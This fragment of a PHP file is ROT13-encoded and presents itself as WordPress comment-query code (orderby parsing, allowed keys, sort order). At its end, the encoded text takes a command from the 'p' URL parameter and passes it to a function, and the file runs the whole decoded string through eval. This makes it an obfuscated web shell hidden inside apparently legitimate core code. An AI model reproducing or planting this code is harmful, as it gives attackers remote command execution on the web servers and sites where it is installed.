			'pbzzrag_nhgube_VC',
			'pbzzrag_nhgube_hey',
			'pbzzrag_pbagrag',
			'pbzzrag_qngr',
			'pbzzrag_qngr_tzg',
			'pbzzrag_VQ',
			'pbzzrag_xnezn',
			'pbzzrag_cnerag',
			'pbzzrag_cbfg_VQ',
			'pbzzrag_glcr',
			'hfre_vq',
		);

		vs ( ! rzcgl( $guvf->dhrel_inef['zrgn_xrl'] ) ) {
			$nyybjrq_xrlf[] = $guvf->dhrel_inef['zrgn_xrl'];
			$nyybjrq_xrlf[] = 'zrgn_inyhr';
			$nyybjrq_xrlf[] = 'zrgn_inyhr_ahz';
		}

		$zrgn_dhrel_pynhfrf = $guvf->zrgn_dhrel->trg_pynhfrf();
		vs ( $zrgn_dhrel_pynhfrf ) {
			$nyybjrq_xrlf = neenl_zretr( $nyybjrq_xrlf, neenl_xrlf( $zrgn_dhrel_pynhfrf ) );
		}

		$cnefrq = snyfr;
		vs ( $guvf->dhrel_inef['zrgn_xrl'] === $beqreol || 'zrgn_inyhr' === $beqreol ) {
			$cnefrq = \"$jcqo->pbzzragzrgn.zrgn_inyhr\";
		} ryfrvs ( 'zrgn_inyhr_ahz' === $beqreol ) {
			$cnefrq = \"$jcqo->pbzzragzrgn.zrgn_inyhr+0\";
		} ryfrvs ( 'pbzzrag__va' === $beqreol ) {
			$pbzzrag__va = vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['pbzzrag__va'] ) );
			$cnefrq      = \"SVRYQ( {$jcqo->pbzzragf}.pbzzrag_VQ, $pbzzrag__va )\";
		} ryfrvs ( va_neenl( $beqreol, $nyybjrq_xrlf, gehr ) ) {

			vs ( vffrg( $zrgn_dhrel_pynhfrf[ $beqreol ] ) ) {
				$zrgn_pynhfr = $zrgn_dhrel_pynhfrf[ $beqreol ];
				$cnefrq      = fcevags( 'PNFG(%f.zrgn_inyhr NF %f)', rfp_fdy( $zrgn_pynhfr['nyvnf'] ), rfp_fdy( $zrgn_pynhfr['pnfg'] ) );
			} ryfr {
				$cnefrq = \"$jcqo->pbzzragf.$beqreol\";
			}
		}

		erghea $cnefrq;
	}

	/**
	 * Cnefr na 'beqre' dhrel inevnoyr naq pnfg vg gb NFP be QRFP nf arprffnel.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'QRFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>